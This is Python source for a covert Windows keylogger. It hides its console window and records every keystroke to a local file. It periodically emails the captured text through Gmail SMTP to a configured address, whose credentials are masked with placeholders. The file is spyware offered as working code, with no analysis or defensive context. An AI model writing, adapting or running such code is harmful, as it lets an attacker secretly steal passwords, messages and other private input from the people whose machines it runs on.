import win32api
import win32console
import win32gui
import pythoncom,pyHook
import time
import datetime
import smtplib
from email.mime.text import MIMEText
import os
import sys

fileLog = 'output.txt'
 
#Hide Console
def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True


win=win32console.GetConsoleWindow()
win32gui.ShowWindow(win,0)
f=open('output.txt','w+')
f.close
email = 'xxxxxxxxxxxxxxxxxxxxx'


def send_email(message,toaddrs):

    try:
        

        fromaddr = 'xxxxxxxxxxxxxxxxxxxxx'
        username = 'xxxxxxxxxxxxxxxxxxxxx' 
        password = 'xxxxxxxxxxxxxxxxxxxxx' 
        message+="<br><br>"
        msg = MIMEText(message, 'html')
        msg['Subject']  = "Log of:   " +str(datetime.datetime.now()) + " --"
        msg['From']=fromaddr
        msg['Reply-to'] = 'no-reply'
        msg['To'] = toaddrs
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(username,password)
        server.sendmail(fromaddr, [toaddrs], msg.as_string())
        server.quit()
    except:

        print "Error"

def OnKeyboardEvent(event):
    if event.Ascii==5:
        sys.exit(0)
    if event.Ascii !=0 or 8:       
        f=open('output.txt','r+')
        buffer=f.read()
        f.close()
        
        if len(buffer)==1:
            send_email("Your Keylogger has started.",email)
            
        elif len(buffer)%500==0 and len(buffer)%501!=0:            
            send_email(buffer[-10000:].replace("\n","<br>"),email)        
        f=open('output.txt','w')
        keylogs=chr(event.Ascii)        
        if event.Ascii==13:
            keylogs='\n'            
        if event.Ascii==32:
            keylogs='  '
        buffer+=keylogs
        f.write(buffer)
        f.close()               
      
                  
hm=pyHook.HookManager()
hm.KeyDown=OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
